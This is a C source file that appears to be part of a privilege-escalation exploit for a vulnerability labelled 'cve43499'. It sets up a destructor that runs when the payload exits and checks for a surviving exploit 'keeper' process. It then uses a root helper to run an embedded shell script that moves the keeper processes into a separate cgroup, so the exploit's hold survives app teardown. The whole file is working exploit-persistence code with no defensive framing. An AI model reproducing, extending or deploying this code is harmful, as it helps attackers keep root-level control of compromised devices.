#define _GNU_SOURCE

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#if defined(APP_PAYLOAD) && APP_PAYLOAD

#define KEEPER_COMM "cve43499-hold"
#define KEEPER_HARDEN_TIMEOUT_MSEC 5000
#define KEEPER_HARDEN_FAILURE_EXIT 125

static const char keeper_harden_script[] =
    "set -u; "
    "root=/sys/fs/cgroup; group=$root/rmg-keepers; "
    "[ -f \"$root/cgroup.procs\" ] || { echo '[keeper] cgroup-v2 root unavailable' >&2; exit 31; }; "
    "mkdir -p \"$group\" || { echo '[keeper] cannot create rmg-keepers cgroup' >&2; exit 32; }; "
    "hold_seen=0; hold_ok=0; failed=0; "
    "for comm in /proc/[0-9]*/comm; do "
      "[ -r \"$comm\" ] || continue; "
      "name=$(cat \"$comm\" 2>/dev/null) || continue; "
      "case \"$name\" in cve43499-hold|cve43499-p0ref) ;; *) continue ;; esac; "
      "pid=${comm#/proc/}; pid=${pid%/comm}; "
      "[ \"$name\" = cve43499-hold ] && hold_seen=$((hold_seen + 1)); "
      "if printf '%s\\n' \"$pid\" > \"$group/cgroup.procs\" 2>/dev/null; then "
        "if [ -r \"/proc/$pid/cgroup\" ] && grep -Fq '/rmg-keepers' \"/proc/$pid/cgroup\" 2>/dev/null; then "
          "echo \"[keeper] hardened name=$name pid=$pid cgroup=/rmg-keepers\"; "
          "[ \"$name\" = cve43499-hold ] && hold_ok=$((hold_ok + 1)); "
        "elif [ \"$name\" = cve43499-p0ref ] && [ ! -e \"/proc/$pid\" ]; then "
          "echo \"[keeper] p0ref pid=$pid exited after reference transfer\"; "
        "else "
          "echo \"[keeper] membership verification failed name=$name pid=$pid\" >&2; failed=1; "
        "fi; "
      "else "
        "if [ \"$name\" = cve43499-p0ref ] && [ ! -e \"/proc/$pid\" ]; then "
          "echo \"[keeper] p0ref pid=$pid exited before migration\"; "
        "else "
          "echo \"[keeper] migration failed name=$name pid=$pid\" >&2; failed=1; "
        "fi; "
      "fi; "
    "done; "
    "[ \"$hold_seen\" -gt 0 ] || { echo '[keeper] critical cve43499-hold not found' >&2; exit 33; }; "
    "[ \"$hold_ok\" -eq \"$hold_seen\" ] || { echo '[keeper] critical hold keeper not fully protected' >&2; exit 34; }; "
    "[ \"$failed\" -eq 0 ] || exit 35; "
    "exit 0";

static int process_comm_equals(const char *pid_name, const char *expected) {
  char path[128];
  char comm[64];
  snprintf(path, sizeof(path), "/proc/%s/comm", pid_name);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t got = read(fd, comm, sizeof(comm) - 1);
  close(fd);
  if (got <= 0) {
    return 0;
  }
  comm[got] = '\0';
  comm[strcspn(comm, "\r\n")] = '\0';
  return strcmp(comm, expected) == 0;
}

static int critical_keeper_exists(void) {
  DIR *proc = opendir("/proc");
  if (!proc) {
    return 0;
  }
  int found = 0;
  struct dirent *entry;
  while ((entry = readdir(proc)) != NULL) {
    if (entry->d_name[0] < '0' || entry->d_name[0] > '9') {
      continue;
    }
    char *end = NULL;
    errno = 0;
    (void)strtol(entry->d_name, &end, 10);
    if (errno || !end || *end) {
      continue;
    }
    if (process_comm_equals(entry->d_name, KEEPER_COMM)) {
      found = 1;
      break;
    }
  }
  closedir(proc);
  return found;
}

static int wait_child_timeout(pid_t child) {
  int status = 0;
  int waited_msec = 0;
  while (waited_msec < KEEPER_HARDEN_TIMEOUT_MSEC) {
    pid_t waited = waitpid(child, &status, WNOHANG);
    if (waited == child) {
      if (WIFEXITED(status)) {
        return WEXITSTATUS(status);
      }
      return WIFSIGNALED(status) ? 128 + WTERMSIG(status) : 1;
    }
    if (waited < 0 && errno != EINTR) {
      return errno ? errno : 1;
    }
    usleep(50000);
    waited_msec += 50;
  }
  kill(child, SIGKILL);
  while (waitpid(child, &status, 0) < 0 && errno == EINTR) {
  }
  return 124;
}

static int harden_exploit_keepers(void) {
  const char *helper = getenv("CVE43499_ROOT_HELPER");
  if (!helper || !*helper || access(helper, X_OK) != 0) {
    dprintf(STDERR_FILENO,
            "[keeper] root helper unavailable; refusing fragile success\n");
    return 126;
  }

  pid_t child = fork();
  if (child < 0) {
    return errno ? errno : 1;
  }
  if (child == 0) {
    execl(helper, helper, "-c", keeper_harden_script, (char *)NULL);
    _exit(127);
  }
  return wait_child_timeout(child);
}

__attribute__((destructor)) static void harden_keepers_before_payload_exit(void) {
  /*
   * Forked exploit workers use _exit(), so this destructor runs on the normal
   * outer payload/shell exit, after a successful worker has created the
   * long-lived allocation keeper.  Failed attempts have no critical keeper
   * and therefore remain untouched.
   */
  if (!critical_keeper_exists()) {
    return;
  }

  int status = harden_exploit_keepers();
  if (status == 0) {
    dprintf(STDOUT_FILENO,
            "[+] Exploit stability keeper detached from app cgroup\n");
    return;
  }

  dprintf(STDERR_FILENO,
          "[-] Exploit keeper cgroup hardening failed rc=%d; "
          "refusing to report a fragile success\n",
          status);
  _exit(KEEPER_HARDEN_FAILURE_EXIT);
}

#endif
